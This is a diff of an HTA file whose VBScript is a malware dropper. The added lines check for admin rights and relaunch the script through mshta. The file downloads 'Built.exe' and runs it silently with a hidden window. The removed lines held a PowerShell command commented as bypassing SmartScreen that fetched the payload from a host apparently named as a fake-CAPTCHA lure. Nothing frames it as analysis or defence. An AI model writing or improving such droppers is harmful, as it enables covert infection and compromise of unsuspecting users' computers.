@@ -16,6 +16,26 @@
 </head>
 <body>
     <script language="VBScript">
+        ' Check if script is running with admin privileges
+        Set objShell = CreateObject("WScript.Shell")
+        If Not IsAdmin() Then
+            objShell.Run "mshta.exe ""javascript:var shell = new ActiveXObject('WScript.Shell'); shell.Run('mshta.exe ""path_to_your_htafile.hta""', 0, true);window.close();""", 1, True
+            WScript.Quit
+        End If
+        
+        ' Function to check if the script is running as Admin
+        Function IsAdmin()
+            On Error Resume Next
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Exec("net session")
+            If Err.Number = 0 Then
+                IsAdmin = True
+            Else
+                IsAdmin = False
+            End If
+            On Error GoTo 0
+        End Function
+        
         ' Create a VBScript to download and execute Built.exe silently
         Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
         Set objStream = CreateObject("ADODB.Stream")
@@ -36,12 +56,9 @@
             objStream.Close
         End If
         
-        ' Run PowerShell command to bypass SmartScreen and execute the EXE
+        ' Run the downloaded EXE file silently
         Set WshShell = CreateObject("WScript.Shell")
-        WshShell.Run "powershell -Command ""[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; 
-        Invoke-WebRequest -Uri 'https://notafakecaptica2222.vercel.app/Built.exe' -OutFile 'C:\Users\Public\Built.exe'; 
-        Start-Process 'C:\Users\Public\Built.exe' -WindowStyle Hidden -Wait""", 0, True
-        
+        WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
     </script>
 </body>
 </html>
